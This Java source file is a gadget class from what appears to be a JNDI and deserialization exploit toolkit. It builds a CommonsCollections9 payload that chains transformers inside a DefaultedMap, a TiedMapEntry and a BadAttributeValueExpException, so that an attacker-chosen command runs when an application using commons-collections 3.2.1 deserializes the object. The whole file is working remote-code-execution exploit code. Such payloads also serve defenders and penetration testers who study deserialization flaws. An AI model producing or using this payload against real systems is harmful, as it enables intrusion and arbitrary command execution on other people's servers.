package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;
import java.util.Map;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({"梅子酒"})

public class CommonsCollections9 implements ObjectPayload<BadAttributeValueExpException>{

    public BadAttributeValueExpException getObject(PayloadType type, String... param) throws Exception {
        String                        command            = param[0];
        String[]                      execArgs           = {command};
        Class                         c                  = (execArgs.length > 1) ? String[].class : String.class;
        ChainedTransformer            chainedTransformer = new ChainedTransformer(new Transformer[]{(Transformer) new ConstantTransformer(Integer.valueOf(1))});
        Transformer[]                 transformers       = TransformerUtil.makeTransformer(command);
        Map<Object, Object>           innerMap           = new HashMap<Object, Object>();
        Map                           defaultedmap       = DefaultedMap.decorate(innerMap, (Transformer) chainedTransformer);
        TiedMapEntry                  entry              = new TiedMapEntry(defaultedmap, "nu1r");
        BadAttributeValueExpException val                = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val, "val", entry);
        Reflections.setFieldValue(chainedTransformer, "iTransformers", transformers);
        return val;
    }
}
